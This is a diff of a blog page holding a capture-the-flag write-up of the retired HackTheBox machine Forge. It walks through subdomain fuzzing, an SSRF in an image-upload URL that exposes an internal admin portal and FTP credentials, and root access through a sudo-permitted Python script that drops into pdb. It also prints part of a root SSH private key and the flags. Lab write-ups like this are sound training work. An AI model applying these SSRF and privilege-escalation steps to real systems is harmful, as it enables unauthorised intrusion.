@@ -1,159 +1,115 @@
 
 <!DOCTYPE html>
+
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-  <meta name="HandheldFriendly" content="True" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <meta name="robots" content="" />
-
-  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">
-
-    <link rel="stylesheet" type="text/css" href="../../theme/stylesheet/style.min.css">
-
-    <link id="dark-theme-style" rel="stylesheet" type="text/css"
-          media="(prefers-color-scheme: dark)"
-    href="../../theme/stylesheet/dark-theme.min.css">
-
-    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
-              media="(prefers-color-scheme: dark)"
-          href="../../theme/pygments/monokai.min.css">
-    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
-              media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)"
-          href="../../theme/pygments/sas.min.css">
-
-
-  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/fontawesome.css">
-  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/brands.css">
-  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/solid.css">
-
-
-    <link href="https://maggick.fr/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="maggick's logs Atom">
-
-
-
-  
-
-
- 
-
-<meta name="author" content="maggick" />
-<meta name="description" content="This is a writeup about a retired HacktheBox machine: Forge publish on September 11, 2021 by NoobHacker9999. This box is rated as a medium machine but could be qualified as an easy medium :). It implies a SSRF and an LFI as well as some Python and a PDB." />
-<meta name="keywords" content="security, boot2root, HTB, SSRF, LFI">
-
-
-  <meta property="og:site_name" content="maggick's logs"/>
-  <meta property="og:title" content="HTB: Forge"/>
-  <meta property="og:description" content="This is a writeup about a retired HacktheBox machine: Forge publish on September 11, 2021 by NoobHacker9999. This box is rated as a medium machine but could be qualified as an easy medium :). It implies a SSRF and an LFI as well as some Python and a PDB."/>
-  <meta property="og:locale" content="en_US"/>
-  <meta property="og:url" content="../../2022/01/htb-forge.html"/>
-  <meta property="og:type" content="article"/>
-  <meta property="article:published_time" content="2022-01-21 17:25:00+01:00"/>
-  <meta property="article:modified_time" content=""/>
-  <meta property="article:author" content="../../author/maggick.html">
-  <meta property="article:section" content="security"/>
-  <meta property="article:tag" content="security"/>
-  <meta property="article:tag" content="boot2root"/>
-  <meta property="article:tag" content="HTB"/>
-  <meta property="article:tag" content="SSRF"/>
-  <meta property="article:tag" content="LFI"/>
-  <meta property="og:image" content="https://maggick.fr/media/image.png">
-
-  <title>maggick's logs &ndash; HTB: Forge</title>
-
-</head>
-<body >
-  <aside>
-    <div>
-      <a href="../../">
-        <img src="https://maggick.fr/media/image.png" alt="maggick's logs" title="maggick's logs">
-      </a>
-
-      <h1>
-        <a href="../../">maggick's logs</a>
-      </h1>
-
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<meta content="" name="robots"/>
+<link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&amp;family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&amp;display=swap" rel="stylesheet"/>
+<link href="../../theme/stylesheet/style.min.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/stylesheet/dark-theme.min.css" id="dark-theme-style" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/pygments/monokai.min.css" id="pygments-dark-theme" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/pygments/sas.min.css" id="pygments-light-theme" media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/fontawesome.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/brands.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/solid.css" rel="stylesheet" type="text/css"/>
+<link href="https://maggick.fr/feeds/all.atom.xml" rel="alternate" title="maggick's logs Atom" type="application/atom+xml"/>
+<meta content="maggick" name="author"/>
+<meta content="This is a writeup about a retired HacktheBox machine: Forge publish on September 11, 2021 by NoobHacker9999. This box is rated as a medium machine but could be qualified as an easy medium :). It implies a SSRF and an LFI as well as some Python and a PDB." name="description"/>
+<meta content="security, boot2root, HTB, SSRF, LFI" name="keywords"/>
+<meta content="maggick's logs" property="og:site_name">
+<meta content="HTB: Forge" property="og:title"/>
+<meta content="This is a writeup about a retired HacktheBox machine: Forge publish on September 11, 2021 by NoobHacker9999. This box is rated as a medium machine but could be qualified as an easy medium :). It implies a SSRF and an LFI as well as some Python and a PDB." property="og:description"/>
+<meta content="en_US" property="og:locale"/>
+<meta content="../../2022/01/htb-forge.html" property="og:url"/>
+<meta content="article" property="og:type"/>
+<meta content="2022-01-21 17:25:00+01:00" property="article:published_time"/>
+<meta content="" property="article:modified_time"/>
+<meta content="../../author/maggick.html" property="article:author"/>
+<meta content="security" property="article:section">
+<meta content="security" property="article:tag"/>
+<meta content="boot2root" property="article:tag"/>
+<meta content="HTB" property="article:tag"/>
+<meta content="SSRF" property="article:tag"/>
+<meta content="LFI" property="article:tag"/>
+<meta content="https://maggick.fr/media/image.png" property="og:image"/>
+<title>maggick's logs – HTB: Forge</title>
+</meta></meta></head>
+<body>
+<aside>
+<div>
+<a href="../../">
+<img alt="maggick's logs" src="https://maggick.fr/media/image.png" title="maggick's logs"/>
+</a>
+<h1>
+<a href="../../">maggick's logs</a>
+</h1>
 <p>Offensive security tales</p>
-
-      <nav>
-        <ul class="list">
-
-
-              <li>
-                <a target="_self"
-                   href="../../pages/about.html">
+<nav>
+<ul class="list">
+<li>
+<a href="../../pages/about.html" target="_self">
                   About
                 </a>
-              </li>
-              <li>
-                <a target="_self"
-                   href="../../pages/notes.html">
+</li>
+<li>
+<a href="../../pages/notes.html" target="_self">
                   Notes
                 </a>
-              </li>
-              <li>
-                <a target="_self"
-                   href="../../pages/tools.html">
+</li>
+<li>
+<a href="../../pages/tools.html" target="_self">
                   Tools
                 </a>
-              </li>
-
-        </ul>
-      </nav>
-
-      <ul class="social">
-          <li>
-            <a  class="sc-github" href="https://github.com/maggick" target="_blank">
-              <i class="fab fa-github"></i>
-            </a>
-          </li>
-          <li>
-            <a  class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
-              <i class="fab fa-twitter"></i>
-            </a>
-          </li>
-          <li>
-            <a  class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
-              <i class="fab fa-stack-overflow"></i>
-            </a>
-          </li>
-          <li>
-            <a  class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
-              <i class="fas fa-rss"></i>
-            </a>
-          </li>
-      </ul>
-    </div>
-
-  </aside>
-  <main>
-
-    <nav>
-      <a href="../../">Home</a>
-
-      <a href="/archives.html">Archives</a>
-      <a href="/categories.html">Categories</a>
-      <a href="/tags.html">Tags</a>
-
-      <a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>
-
-    </nav>
-
+</li>
+</ul>
+</nav>
+<ul class="social">
+<li>
+<a class="sc-github" href="https://github.com/maggick" target="_blank">
+<i class="fab fa-github"></i>
+</a>
+</li>
+<li>
+<a class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
+<i class="fab fa-twitter"></i>
+</a>
+</li>
+<li>
+<a class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
+<i class="fab fa-stack-overflow"></i>
+</a>
+</li>
+<li>
+<a class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
+<i class="fas fa-rss"></i>
+</a>
+</li>
+</ul>
+</div>
+</aside>
+<main>
+<nav>
+<a href="../../">Home</a>
+<a href="/archives.html">Archives</a>
+<a href="/categories.html">Categories</a>
+<a href="/tags.html">Tags</a>
+<a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>
+</nav>
 <article class="single">
-  <header>
-      
-    <h1 id="htb-forge">HTB: Forge</h1>
-    <p>
+<header>
+<h1 id="htb-forge">HTB: Forge</h1>
+<p>
       Posted on 21 Jan 2022 in <a href="../../category/security.html">security</a>
 
-        &#8226; 3 min read
+        • 3 min read
     </p>
-  </header>
-
-
-  <div>
-    <p><img class="align-left" src="/media/2022.01/forge_card.png" alt="Forge Card" width="262"></p>
+</header>
+<div>
+<p><img alt="Forge Card" class="align-left" src="/media/2022.01/forge_card.png" width="262"/></p>
 <p>This is a writeup about a retired HacktheBox machine:
 <a href="https://www.hackthebox.com/home/machines/profile/376">Forge</a> publish on
 September 11, 2021 by
@@ -161,8 +117,6 @@ September 11, 2021 by
 This box is rated as a medium machine but could be qualified as an easy medium
 :). It implies a SSRF and an LFI as well as some Python and a
 <a href="https://docs.python.org/3/library/pdb.html">PDB</a>.</p>
-
-
 <h1>Foothold</h1>
 <h2>Recon</h2>
 <p>Let us start as always by a <code>nmap</code> scan. Only port 80 (HTTP) and 22 (SSH) are
@@ -176,7 +130,6 @@ PORT   STATE    SERVICE VERSION
 22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
 80/tcp open     http    Apache httpd 2.4.41 ((Ubuntu))
 </code></pre></div>
-
 <h2>Website</h2>
 <p>The website is a gallery that allow to upload an image either from the
 filesystem or from an URL.</p>
@@ -184,8 +137,8 @@ filesystem or from an URL.</p>
 <a href="https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS">subdomain secList</a>
 to discover that the domain admin.forge.htb exist.</p>
 <div class="highlight"><pre><span></span><code><span class="err">```</span><span class="n">text</span><span class="w"></span>
-<span class="err">└─</span><span class="o">$</span><span class="w"> </span><span class="n">wfuzz</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="o">-</span><span class="n">w</span><span class="w"> </span><span class="n">subdomains</span><span class="o">-</span><span class="n">top1million</span><span class="o">-</span><span class="mf">5000.</span><span class="n">txt</span><span class="w"> </span><span class="o">--</span><span class="n">sc</span><span class="w"> </span><span class="mi">200</span><span class="w"> </span><span class="o">-</span><span class="n">H</span><span class="w"> </span><span class="s2">&quot;HOST:FUZZ.forge.htb&quot;</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">forge</span><span class="o">.</span><span class="n">htb</span><span class="w"></span>
-<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">python3</span><span class="o">/</span><span class="n">dist</span><span class="o">-</span><span class="n">packages</span><span class="o">/</span><span class="n">wfuzz</span><span class="o">/</span><span class="n">__init__</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="w"> </span><span class="n">UserWarning</span><span class="p">:</span><span class="n">Pycurl</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">compiled</span><span class="w"> </span><span class="n">against</span><span class="w"> </span><span class="n">Openssl</span><span class="o">.</span><span class="w"> </span><span class="n">Wfuzz</span><span class="w"> </span><span class="n">might</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">work</span><span class="w"> </span><span class="n">correctly</span><span class="w"> </span><span class="n">when</span><span class="w"> </span><span class="n">fuzzing</span><span class="w"> </span><span class="n">SSL</span><span class="w"> </span><span class="n">sites</span><span class="o">.</span><span class="w"> </span><span class="n">Check</span><span class="w"> </span><span class="n">Wfuzz</span><span class="s1">&#39;s documentation for more information.</span>
+<span class="err">└─</span><span class="o">$</span><span class="w"> </span><span class="n">wfuzz</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="o">-</span><span class="n">w</span><span class="w"> </span><span class="n">subdomains</span><span class="o">-</span><span class="n">top1million</span><span class="o">-</span><span class="mf">5000.</span><span class="n">txt</span><span class="w"> </span><span class="o">--</span><span class="n">sc</span><span class="w"> </span><span class="mi">200</span><span class="w"> </span><span class="o">-</span><span class="n">H</span><span class="w"> </span><span class="s2">"HOST:FUZZ.forge.htb"</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">forge</span><span class="o">.</span><span class="n">htb</span><span class="w"></span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">python3</span><span class="o">/</span><span class="n">dist</span><span class="o">-</span><span class="n">packages</span><span class="o">/</span><span class="n">wfuzz</span><span class="o">/</span><span class="n">__init__</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="w"> </span><span class="n">UserWarning</span><span class="p">:</span><span class="n">Pycurl</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">compiled</span><span class="w"> </span><span class="n">against</span><span class="w"> </span><span class="n">Openssl</span><span class="o">.</span><span class="w"> </span><span class="n">Wfuzz</span><span class="w"> </span><span class="n">might</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">work</span><span class="w"> </span><span class="n">correctly</span><span class="w"> </span><span class="n">when</span><span class="w"> </span><span class="n">fuzzing</span><span class="w"> </span><span class="n">SSL</span><span class="w"> </span><span class="n">sites</span><span class="o">.</span><span class="w"> </span><span class="n">Check</span><span class="w"> </span><span class="n">Wfuzz</span><span class="s1">'s documentation for more information.</span>
 <span class="o">********************************************************</span><span class="w"></span>
 <span class="o">*</span><span class="w"> </span><span class="n">Wfuzz</span><span class="w"> </span><span class="mf">3.1</span><span class="o">.</span><span class="mi">0</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="n">Web</span><span class="w"> </span><span class="n">Fuzzer</span><span class="w">                         </span><span class="o">*</span><span class="w"></span>
 <span class="o">********************************************************</span><span class="w"></span>
@@ -197,10 +150,9 @@ to discover that the domain admin.forge.htb exist.</p>
 <span class="n">ID</span><span class="w">           </span><span class="n">Response</span><span class="w">   </span><span class="n">Lines</span><span class="w">    </span><span class="n">Word</span><span class="w">       </span><span class="n">Chars</span><span class="w">       </span><span class="n">Payload</span><span class="w"></span>
 <span class="o">=====================================================================</span><span class="w"></span>
 
-<span class="mi">000000024</span><span class="p">:</span><span class="w">   </span><span class="mi">200</span><span class="w">        </span><span class="mi">1</span><span class="w"> </span><span class="n">L</span><span class="w">      </span><span class="mi">4</span><span class="w"> </span><span class="n">W</span><span class="w">        </span><span class="mi">27</span><span class="w"> </span><span class="n">Ch</span><span class="w">       </span><span class="s2">&quot;admin - admin&quot;</span><span class="w"></span>
+<span class="mi">000000024</span><span class="p">:</span><span class="w">   </span><span class="mi">200</span><span class="w">        </span><span class="mi">1</span><span class="w"> </span><span class="n">L</span><span class="w">      </span><span class="mi">4</span><span class="w"> </span><span class="n">W</span><span class="w">        </span><span class="mi">27</span><span class="w"> </span><span class="n">Ch</span><span class="w">       </span><span class="s2">"admin - admin"</span><span class="w"></span>
 <span class="err">```</span><span class="w"></span>
 </code></pre></div>
-
 <p>We cannot access the admin interface as some IP filtering is in place.
 We try to includ the page by uploading it as an image using the URL but it
 failes with an error message: "URL contains a blacklisted address!"</p>
@@ -209,12 +161,12 @@ page http://admin.FORGE.htb</p>
 <div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Admin Portal<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
 <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
 <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&quot;stylesheet&quot;</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text/css&quot;</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;/static/css/main.css&quot;</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">"stylesheet"</span> <span class="na">type</span><span class="o">=</span><span class="s">"text/css"</span> <span class="na">href</span><span class="o">=</span><span class="s">"/static/css/main.css"</span><span class="p">&gt;</span>
     <span class="p">&lt;</span><span class="nt">header</span><span class="p">&gt;</span>
             <span class="p">&lt;</span><span class="nt">nav</span><span class="p">&gt;</span>
-                <span class="p">&lt;</span><span class="nt">h1</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;&quot;</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;/&quot;</span><span class="p">&gt;</span>Portal home<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
-                <span class="p">&lt;</span><span class="nt">h1</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;align-right margin-right&quot;</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;/announcements&quot;</span><span class="p">&gt;</span>Announcements<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
-                <span class="p">&lt;</span><span class="nt">h1</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;align-right&quot;</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;/upload&quot;</span><span class="p">&gt;</span>Upload image<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+                <span class="p">&lt;</span><span class="nt">h1</span> <span class="na">class</span><span class="o">=</span><span class="s">""</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">"/"</span><span class="p">&gt;</span>Portal home<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+                <span class="p">&lt;</span><span class="nt">h1</span> <span class="na">class</span><span class="o">=</span><span class="s">"align-right margin-right"</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">"/announcements"</span><span class="p">&gt;</span>Announcements<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+                <span class="p">&lt;</span><span class="nt">h1</span> <span class="na">class</span><span class="o">=</span><span class="s">"align-right"</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">"/upload"</span><span class="p">&gt;</span>Upload image<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
             <span class="p">&lt;/</span><span class="nt">nav</span><span class="p">&gt;</span>
     <span class="p">&lt;/</span><span class="nt">header</span><span class="p">&gt;</span>
     <span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
@@ -223,13 +175,11 @@ page http://admin.FORGE.htb</p>
 <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
 <span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
 </code></pre></div>
-
 <p>We look at the <code>announcements</code> page:</p>
 <div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>An internal ftp server has been setup with credentials as user:heightofsecurity123!<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
 <span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
 <span class="p">&lt;</span><span class="nt">li</span><span class="p">&gt;</span>The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=<span class="ni">&amp;lt;</span>url<span class="ni">&amp;gt;</span>.<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
 </code></pre></div>
-
 <p>We try to load the FTP page using the disclosed credentials
 <code>http://admin.FORGE.htb/upload?u=ftp://user:heightofsecurity123!@FORGE.htb/</code>
 We got two files <code>user.txt</code> and <code>snap</code>.</p>
@@ -242,7 +192,6 @@ Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64)
 user@forge:~$ cat user.txt
 4a8aed62cdd2fca87ce185b780ee3e89
 </code></pre></div>
-
 <h1>Root</h1>
 <p>We look at our privileges (<code>sudo -l</code>) and we see that we can run <code>/usr/bin/python3 /opt/remote-manage.py</code>
 as <code>root</code> without password. Looking at the script it is a remote manager script
@@ -254,22 +203,21 @@ us to load the <code>os</code> module and execute system commands as root using
 <code>os.system([COMMAND])</code>.</p>
 <div class="highlight"><pre><span></span><code>user@forge:~$ sudo /usr/bin/python3 /opt/remote-manage.py
 Listening on localhost:59816
-invalid literal for int() with base 10: b&#39;q&#39;
+invalid literal for int() with base 10: b'q'
 &gt; /opt/remote-manage.py(27)&lt;module&gt;()
 -&gt; option = int(clientsock.recv(1024).strip())
 (Pdb) --KeyboardInterrupt--
 (Pdb) import os
-(Pdb) os.system(&#39;id&#39;)
+(Pdb) os.system('id')
 uid=0(root) gid=0(root) groups=0(root)
 0
 </code></pre></div>
-
 <p>We just grab the root SSH private key and connect on the box as <code>root</code> allowing us
 to get the flag.</p>
-<div class="highlight"><pre><span></span><code>(Pdb) os.system(&#39;ls /root/.ssh&#39;)
+<div class="highlight"><pre><span></span><code>(Pdb) os.system('ls /root/.ssh')
 authorized_keys  id_rsa  id_rsa.pub
 0
-(Pdb) os.system(&#39;cat /root/.ssh/id_rsa&#39;)
+(Pdb) os.system('cat /root/.ssh/id_rsa')
 -----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
 NhAAAAAwEAAQAAAYEAusTE7uvvBLrfqDLv6I/+Xc9W/RVGA4eFPOowUNkHDZ4MTUm4cK4/
@@ -284,68 +232,46 @@ uid=0(root) gid=0(root) groups=0(root)
 root@forge:~# cat root.txt
 5a7c66fcccbc8a380f220f349e6eea95
 </code></pre></div>
-
 <h1>Wrapping up</h1>
 <p>This box was really easy for a medium one. The root part really easy. I
 triggered it by mistake as "q" for quit is an old habit. Once you get the
 subdomain the user part just requires to follow the dots. A great medium box for
 beginners.</p>
-  </div>
-  <div class="tag-cloud">
-    <p>
-      <a href="../../tag/security.html">security</a>
-      <a href="../../tag/boot2root.html">boot2root</a>
-      <a href="../../tag/htb.html">HTB</a>
-      <a href="../../tag/ssrf.html">SSRF</a>
-      <a href="../../tag/lfi.html">LFI</a>
-    </p>
-  </div>
-
-
-  <div class="neighbors">
-    <a class="btn float-left" href="../../2022/01/htb-previse.html" title="HTB: Previse">
-      <i class="fa fa-angle-left"></i> Previous Post
-    </a>
-    <a class="btn float-right" href="../../2022/02/htb-horizontall.html" title="HTB: Horizontall">
-      Next Post <i class="fa fa-angle-right"></i>
-    </a>
-  </div>
-
-
-
-</article>
-
-    <footer>
+</div>
+<div class="tag-cloud">
 <p>
-  &copy; 2022  - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/deed.en_US" target="_blank">Creative Commons Attribution</a>
+<a href="../../tag/security.html">security</a>
+<a href="../../tag/boot2root.html">boot2root</a>
+<a href="../../tag/htb.html">HTB</a>
+<a href="../../tag/ssrf.html">SSRF</a>
+<a href="../../tag/lfi.html">LFI</a>
+</p>
+</div>
+<div class="neighbors">
+<a class="btn float-left" href="../../2022/01/htb-previse.html" title="HTB: Previse">
+<i class="fa fa-angle-left"></i> Previous Post
+    </a>
+<a class="btn float-right" href="../../2022/02/htb-horizontall.html" title="HTB: Horizontall">
+      Next Post <i class="fa fa-angle-right"></i>
+</a>
+</div>
+</article>
+<footer>
+<p>
+  © 2022  - This work is licensed under a <a href="http://creativecommons.org/licenses/by/4.0/deed.en_US" rel="license" target="_blank">Creative Commons Attribution</a>
 </p>
 <p>
 Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
   <span class="footer-separator">|</span>
   Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
-  <script id="dark-theme-script"
-          src="../../theme/dark-theme/dark-theme.min.js"
-          data-enable-auto-detect-theme="True"
-          data-default-theme="light"
-          type="text/javascript">
-  </script>
+  <script data-default-theme="light" data-enable-auto-detect-theme="True" id="dark-theme-script" src="../../theme/dark-theme/dark-theme.min.js" type="text/javascript">
+</script>
 </p><p>
-  <a rel="license"
-     href="http://creativecommons.org/licenses/by/4.0/"
-     target="_blank">
-    <img alt="Creative Commons License"
-         title="Creative Commons License"
-         style="border-width:0"
-           src="https://i.creativecommons.org/l/by/4.0/80x15.png"
-         width="80"
-         height="15"/>
-  </a>
-</p>    </footer>
-  </main>
-
-
-
-
+<a href="http://creativecommons.org/licenses/by/4.0/" rel="license" target="_blank">
+<img alt="Creative Commons License" height="15" src="https://i.creativecommons.org/l/by/4.0/80x15.png" style="border-width:0" title="Creative Commons License" width="80">
+</img></a>
+</p> </footer>
+</main>
 <script type="application/ld+json">
 {
   "@context" : "http://schema.org",
@@ -356,6 +282,5 @@ Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a 
   "description": ""
 }
 </script>
-
 </body>
 </html>
